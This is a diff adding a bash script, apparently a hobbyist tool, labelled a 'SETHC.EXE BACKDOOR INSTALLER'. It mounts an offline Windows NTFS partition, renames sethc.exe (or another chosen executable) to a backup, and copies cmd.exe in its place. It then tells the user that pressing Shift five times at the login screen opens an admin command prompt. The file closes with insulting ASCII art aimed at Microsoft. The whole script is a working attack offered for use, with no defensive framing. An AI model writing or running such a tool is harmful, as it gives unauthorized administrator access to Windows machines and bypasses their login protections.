@@ -1,0 +1,156 @@
+#!/bin/bash
+
+RED='\033[41;1m'
+GRN='\033[42;1m'
+YEL='\033[43;1m'
+BLU='\033[44;1m'
+NC='\033[0m' # No Color
+PRE='[SETHC_BD]'
+UL='\033[4;7m'
+INV='\033[7m'i
+
+ONG='\033[31m'
+TEL='\033[38;5;87m'
+
+echo " "
+echo -e ${BLU}"    _  _  ____  __  __  ___  ____  ___     "${NC}
+echo -e ${BLU}"   ( \( )(_  _)(  \/  )/ __)( ___)/ __)    "${NC}
+echo -e ${BLU}"    )  (  _)(_  )    ( \__ \ )__)( (__     "${NC}
+echo -e ${BLU}"   (_)\_)(____)(_/\/\_)(___/(____)\___)    "${NC}
+echo -e ${BLU}"                                           "${NC}
+echo -e ${BLU}"SETHC.EXE BACKDOOR INSTALLER v0.1 BY NIMSEC"${NC}
+echo " "
+
+if [ -z "$1" ]
+    then
+        echo -e "${RED}${PRE}${NC}${UL} Must specify a device! Exiting..."${NC}
+        exit
+elif [ -e "$1" ]
+    then
+        echo -e "${GRN}${PRE}${NC}${UL} Device $1 is valid! Proceeding..."${NC}
+else
+        echo -e "${RED}${PRE}${NC}${UL}  Device $1 does not exist! Exiting..."${NC}
+        exit
+fi
+
+if [ -z "$2" ]
+    then
+        echo -e "${YEL}${PRE}${NC}${UL} No target EXE file name specified. Defaulting to sethc..."${NC}
+        EXENAME='sethc'
+    else
+        EXENAME=$2
+        echo -e "${GRN}${PRE}${NC}${UL} Set target EXE file to ${EXENAME}.exe..."${NC}
+fi
+
+echo " "
+
+echo -e "${YEL}${PRE}${NC}${UL} Checking if /mnt/tempwindir/ already exists..."${NC}
+if [ -d /mnt/tempwindir ]
+    then
+        echo -e "${RED}${PRE}${NC}${UL} /mnt/tempwindir exists, manually fix with:"${NC}
+        echo "umount /mnt/tempwindir"
+        echo "rmdir /mnt/tempwindir/"
+        exit
+    else
+        mkdir -v /mnt/tempwindir
+fi
+
+echo " "
+
+echo -e "${YEL}${PRE}${NC}${UL} Running 'ntfsfix $1'..."${NC}
+ntfsfix $1
+
+echo " "
+
+echo -e "${YEL}${PRE}${NC}${UL} Running 'mount -v $1 /mnt/tempwindir'..."${NC}
+mount -v $1 /mnt/tempwindir
+echo -e "${GRN}${PRE}${NC}${UL} Mounted $1 to /mnt/tempwindir/..."${NC}
+
+echo " "
+
+echo -e "${YEL}${PRE}${NC}${UL} Checking if ${EXENAME}.exe exists in C:\Windows\System32..."${NC}
+if [ -f /mnt/tempwindir/Windows/System32/$EXENAME.exe ]
+    then
+        echo -e "${GRN}${PRE}${NC}${UL} ${EXENAME}.exe exists, continuing attack..."${NC}
+    else
+        echo -e "${RED}${PRE}${NC}${UL} ${EXENAME}.exe does not exist on system..."${NC}
+        
+        sleep 1 #lets everything catch up
+        
+        echo -e "${RED}${PRE}${NC}${UL} Running 'umount -v /mnt/tempwindir'..."${NC}
+        umount -v /mnt/tempwindir
+
+        echo -e "${RED}${PRE}${NC}${UL} Running 'rmdir /mnt/tempwindir/'..."${NC}
+        rmdir -v /mnt/tempwindir/
+        
+        echo " "
+        
+        echo -e "${RED}${PRE}${NC}${UL} Backdoor failed! Please try again with a different file name! Exiting..."${NC}
+        exit
+fi
+
+echo " "
+
+echo -e "${YEL}${PRE}${NC}${UL} Checking if ${EXENAME}.exe.bak already exists..."${NC}
+if [ -f /mnt/tempwindir/Windows/System32/$EXENAME.exe.bak ]
+    then
+        echo -e "${YEL}${PRE}${NC}${UL} ${EXENAME}.exe.bak exists, not replacing..."${NC}
+        rm -v /mnt/tempwindir/Windows/System32/$EXENAME.exe
+    else
+        mv -v /mnt/tempwindir/Windows/System32/$EXENAME.exe /mnt/tempwindir/Windows/System32/$EXENAME.exe.bak
+        echo -e "${GRN}${PRE}${NC}${UL} Backed up original ${EXENAME}.exe to ${EXENAME}.exe.bak..."${NC}
+fi
+
+echo " "
+
+echo -e "${YEL}${PRE}${NC}${UL} Replacing ${EXENAME}.exe with cmd.exe..."${NC}
+cp -v /mnt/tempwindir/Windows/System32/cmd.exe /mnt/tempwindir/Windows/System32/$EXENAME.exe
+
+echo " "
+
+echo -e "${YEL}${PRE}${NC}${UL} Running 'umount -v /mnt/tempwindir'..."${NC}
+umount -v /mnt/tempwindir
+
+echo " "
+
+echo -e "${YEL}${PRE}${NC}${UL} Running 'rmdir -v /mnt/tempwindir/'..."${NC}
+rmdir -v /mnt/tempwindir/
+
+echo " "
+
+echo -e "${GRN}${PRE}${NC}${UL} Windows cmd.exe replacement backdoor completed against ${EXENAME}.exe on $1"${NC}
+echo -e "${GRN}${PRE}${NC}${UL} (If sethc.exe) At the login screen, press shift 5x for an admin command prompt."${NC}
+
+echo " "
+
+echo -n -e ${ONG}
+echo "                       █████▒█    ██  ▄████▄   ██ ▄█▀                        ";
+echo "                     ▓██   ▒ ██  ▓██▒▒██▀ ▀█   ██▄█▒                         ";
+echo "                     ▒████ ░▓██  ▒██░▒▓█    ▄ ▓███▄░                         ";
+echo "                     ░▓█▒  ░▓▓█  ░██░▒▓▓▄ ▄██▒▓██ █▄                         ";
+echo "                     ░▒█░   ▒▒█████▓ ▒ ▓███▀ ░▒██▒ █▄                        ";
+echo "                      ▒ ░   ░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░▒ ▒▒ ▓▒                        ";
+echo "                      ░     ░░▒░ ░ ░   ░  ▒   ░ ░▒ ▒░                        ";
+echo "                      ░ ░    ░░░ ░ ░ ░        ░ ░░ ░                         ";
+echo "                               ░     ░ ░      ░  ░                           ";
+echo "                                     ░                                       ";
+echo "                        ▓██   ██▓ ▒█████   █    ██                           ";
+echo "                         ▒██  ██▒▒██▒  ██▒ ██  ▓██▒                          ";
+echo "                          ▒██ ██░▒██░  ██▒▓██  ▒██░                          ";
+echo "                          ░ ▐██▓░▒██   ██░▓▓█  ░██░                          ";
+echo "                          ░ ██▒▓░░ ████▓▒░▒▒█████▓                           ";
+echo "                           ██▒▒▒ ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒                           ";
+echo "                         ▓██ ░▒░   ░ ▒ ▒░ ░░▒░ ░ ░                           ";
+echo "                         ▒ ▒ ░░  ░ ░ ░ ▒   ░░░ ░ ░                           ";
+echo "                         ░ ░         ░ ░     ░                               ";
+echo "                         ░ ░                                                 ";
+echo " ███▄ ▄███▓ ██▓ ▄████▄   ██▀███   ▒█████    ██████  ▒█████    █████▒▄▄▄█████▓";
+echo "▓██▒▀█▀ ██▒▓██▒▒██▀ ▀█  ▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ ▒██▒  ██▒▓██   ▒ ▓  ██▒ ▓▒";
+echo "▓██    ▓██░▒██▒▒▓█    ▄ ▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄   ▒██░  ██▒▒████ ░ ▒ ▓██░ ▒░";
+echo "▒██    ▒██ ░██░▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██   ██░  ▒   ██▒▒██   ██░░▓█▒  ░ ░ ▓██▓ ░ ";
+echo "▒██▒   ░██▒░██░▒ ▓███▀ ░░██▓ ▒██▒░ ████▓▒░▒██████▒▒░ ████▓▒░░▒█░      ▒██▒ ░ ";
+echo "░ ▒░   ░  ░░▓  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░  ▒ ░      ▒ ░░   ";
+echo "░  ░      ░ ▒ ░  ░  ▒     ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░  ░ ▒ ▒░  ░          ░    ";
+echo "░      ░    ▒ ░░          ░░   ░ ░ ░ ░ ▒  ░  ░  ░  ░ ░ ░ ▒   ░ ░      ░      ";
+echo "       ░    ░  ░ ░         ░         ░ ░        ░      ░ ░                   ";
+echo "               ░                                                             ";
